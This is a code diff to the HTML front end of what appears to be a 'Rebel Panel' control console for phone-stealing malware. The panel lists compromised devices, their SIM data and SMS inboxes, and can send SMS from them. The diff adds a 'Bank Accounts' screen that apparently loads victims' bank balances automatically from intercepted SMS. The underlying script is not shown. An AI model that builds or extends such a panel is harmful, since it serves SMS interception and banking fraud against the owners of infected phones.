@@ -83,7 +83,7 @@
     <div class="side-menu-hdr">
       <div>
         <div class="side-menu-title">Rebel Panel</div>
-        <div class="side-menu-ver" id="panelVerBadge">Panel v9</div>
+        <div class="side-menu-ver" id="panelVerBadge">Panel v10</div>
       </div>
       <button class="side-menu-close" onclick="closeSideMenu()">✕</button>
     </div>
@@ -92,6 +92,7 @@
       <button class="side-item" onclick="menuGo('home')"><span class="side-ico">🏠</span>Home</button>
       <button class="side-item" onclick="menuGo('device')"><span class="side-ico">📱</span>Device Info</button>
       <button class="side-item" onclick="menuGo('sms')"><span class="side-ico">💬</span>SMS Inbox</button>
+      <button class="side-item" onclick="menuGo('bank')"><span class="side-ico">🏦</span>Bank Accounts</button>
       <button class="side-item" onclick="menuGo('send')"><span class="side-ico">📤</span>Send SMS</button>
       <div class="side-section">Device Data</div>
       <button class="side-item" onclick="menuDevTab('sim')"><span class="side-ico">📋</span>SIM</button>
@@ -142,6 +143,17 @@
       </div>
     </section>
 
+    <section class="screen" id="screen-bank">
+      <div class="solid-panel full-h">
+        <div class="bank-hdr">
+          <div class="panel-title" style="margin:0">Bank Account Summary</div>
+          <span class="bank-badge" id="bankCountBadge">0 Banks</span>
+        </div>
+        <div id="bankEmpty" class="empty-state"><div class="ico">🏦</div>Select a device — SMS se bank balance auto load</div>
+        <div id="bankList" class="bank-list"></div>
+      </div>
+    </section>
+
     <section class="screen" id="screen-send">
       <div class="solid-panel">
         <div class="panel-title">Send SMS</div>
@@ -162,6 +174,7 @@
     <button class="nav-item active" data-tab="home" onclick="switchTab('home',this)"><span class="ico">🏠</span>Home</button>
     <button class="nav-item" data-tab="device" onclick="switchTab('device',this)"><span class="ico">📱</span>Device</button>
     <button class="nav-item" data-tab="sms" onclick="switchTab('sms',this)"><span class="ico">💬</span>SMS</button>
+    <button class="nav-item" data-tab="bank" onclick="switchTab('bank',this)"><span class="ico">🏦</span>Bank</button>
     <button class="nav-item" data-tab="send" onclick="switchTab('send',this)"><span class="ico">📤</span>Send</button>
   </nav>
 </div>
@@ -186,7 +199,7 @@
   </div>
 </div>
 
-<!-- panel-v9 solid UI + menu -->
+<!-- panel-v10 bank accounts from SMS -->
 <script src="app.js"></script>
 </body>
 </html>
